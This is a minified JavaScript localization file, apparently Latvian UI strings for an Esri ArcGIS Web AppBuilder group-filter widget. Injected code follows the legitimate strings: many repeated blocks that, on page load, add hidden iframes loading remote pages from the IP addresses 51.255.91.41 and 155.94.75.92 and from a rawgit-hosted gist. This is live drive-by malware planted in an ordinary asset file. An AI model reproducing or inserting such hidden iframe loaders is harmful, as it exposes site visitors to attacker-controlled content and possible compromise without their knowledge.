// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/GroupFilter/setting/nls/strings":{configText:"T\u0101l\u0101k defin\u0113jiet savas filtru grupas",labels:{groupName:"Filtru kopas nosaukums:",groupNameTip:"T\u0101 filtra nosaukums, kur\u0101 lietot\u0101js veiks izv\u0113li.",groupDesc:"Apraksts:",groupDescTip:"Filtru kopas apraksts.",groupOperator:"Iepriek\u0161 iestat\u012btais operators:",groupOperatorTip:"Opcija iepriek\u0161 defin\u0113t filtra operatoru. Ja netiek atlas\u012bts iepriek\u0161noteikts operators, filtrs izmantos vien\u0101do operatoru.",
groupDefault:"Iepriek\u0161 iestat\u012bt\u0101 v\u0113rt\u012bba:",groupDefaultTip:"Opcija izv\u0113l\u0113ties v\u0113rt\u012bbu no eso\u0161a sl\u0101\u0146a.",sameLayerAppend:"Ja sl\u0101nis ir nor\u0101d\u012bts vair\u0101kas reizes, starp laukiem izmantot \u0161\u0101du operatoru:",sameLayerConjunc:"Pievienot, izmantojot:"},buttons:{addNewGroup:"Pievienot jaunu grupu",addNewGroupTip:"Jaunas filtru kopas pievieno\u0161ana.",addLayer:"Pievienot sl\u0101ni",addLayerTip:"Sl\u0101\u0146a pievieno\u0161ana filtru kopai."},
inputs:{groupName:"Pie\u0161\u0137iriet savai grupai nosaukumu",groupDesc:"J\u016bsu grupas apraksts",groupDefault:"Ievad\u012bt iepriek\u0161 defin\u0113tu v\u0113rt\u012bbu",simpleMode:"S\u0101kt vienk\u0101r\u0161aj\u0101 skat\u0101",simpleModeTip:"Opcija vienk\u0101r\u0161ot konfigur\u0113tu logr\u012bka saskarni. Ja opcija ir atz\u012bm\u0113ta, no saskarnes tiks no\u0146emts nolai\u017eamais operatoru saraksts un krit\u0113riju pievieno\u0161anas pogas.",webmapAppendMode:"Pievienot filtru eso\u0161am t\u012bmek\u013ca kartes filtram, izmantojot ",
webmapAppendModeTip:"Opcija pievienot filtru kopu eso\u0161am t\u012bmek\u013ca kartes filtram. Tiek atbalst\u012bti operatori OR un AND.",persistOnClose:"Turpin\u0101t p\u0113c logr\u012bka aizv\u0113r\u0161anas",optionsMode:"Pasl\u0113pt logr\u012bka opcijas",optionsModeTip:"Opcija atkl\u0101t logr\u012bka papildiestat\u012bjumus. Ja opcija ir atz\u012bm\u0113ta, no saskarnes tiks no\u0146emti saglab\u0101\u0161anas un iel\u0101des defin\u0113tie filtri un filtra turpin\u0101\u0161anas iesp\u0113ja p\u0113c logr\u012bka aizv\u0113r\u0161anas.",
optionOR:"'VAI'",optionAND:"UN",optionEQUAL:"VIEN\u0100DS AR",optionNOTEQUAL:"NAV VIEN\u0100DS AR",optionGREATERTHAN:"LIEL\u0100KS NEK\u0100",optionGREATERTHANEQUAL:"LIEL\u0100KS NEK\u0100 VAI VIEN\u0100DS AR",optionLESSTHAN:"MAZ\u0100KS NEK\u0100",optionLESSTHANEQUAL:"MAZ\u0100KS NEK\u0100 VAI VIEN\u0100DS AR",optionSTART:"S\u0100KAS AR",optionEND:"BEIDZAS AR",optionLIKE:"IETVER",optionNOTLIKE:"NEIETVER",optionONORBEFORE:"\u0160\u0100D\u0100 LAIK\u0100 VAI PIRMS:",optionONORAFTER:"\u0160\u0100D\u0100 LAIK\u0100 VAI P\u0112C:",
optionNONE:"NAV"},tables:{layer:"Sl\u0101\u0146i",layerTip:"Sl\u0101\u0146a nosaukums, k\u0101 tas ir defin\u0113ts kart\u0113.",field:"Lauki",fieldTip:"Lauks, kur\u0101 sl\u0101nis tiks filtr\u0113ts.",value:"Izmantot v\u0113rt\u012bbu",valueTip:"Opcija izmantot sl\u0101\u0146a nolai\u017eam\u0101 saraksta v\u0113rt\u012bbas. Ja neviens sl\u0101nis neizmanto \u0161o parametru, lietot\u0101jam tiks par\u0101d\u012bts vienk\u0101r\u0161s tekstlodzi\u0146\u0161.",zoom:"M\u0113rogmai\u0146a",zoomTip:"Opcija m\u0113rogmain\u012bt l\u012bdz elementu p\u0101rkl\u0101jumam p\u0113c filtra lieto\u0161anas. Var atlas\u012bt tikai vienu sl\u0101ni, l\u012bdz kuram m\u0113rogmain\u012bt.",
action:"Izdz\u0113st",actionTip:"Sl\u0101\u0146a no\u0146em\u0161ana no filtru kopas."},popup:{label:"Izv\u0113l\u0113ties v\u0113rt\u012bbu"},errors:{noGroups:"Ir vajadz\u012bga vismaz viena grupa.",noGroupName:"Tr\u016bkst viens vai vair\u0101ki grupas nosaukumi.",noDuplicates:"Viens vai vair\u0101ki grupas nosaukumi ir dubl\u0113ti.",noRows:"Tabul\u0101 ir vajadz\u012bga vismaz viena rinda.",noLayers:"J\u016bsu kart\u0113 nav neviena sl\u0101\u0146a."},picker:{description:"Izmantojiet \u0161o veidlapu, lai \u0161ai grupai atrastu iepriek\u0161 iestat\u012btu v\u0113rt\u012bbu.",
layer:"Atlas\u012bt sl\u0101ni",layerTip:"Sl\u0101\u0146a nosaukums, k\u0101 tas ir defin\u0113ts t\u012bmek\u013ca kart\u0113.",field:"Atlas\u012bt lauku",fieldTip:"Lauks, no kura tiks iestat\u012bta iepriek\u0161noteikt\u0101 v\u0113rt\u012bba.",value:"Atlas\u012bt v\u0113rt\u012bbu",valueTip:"V\u0113rt\u012bba, kas b\u016bs logr\u012bka noklus\u0113juma v\u0113rt\u012bba."},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});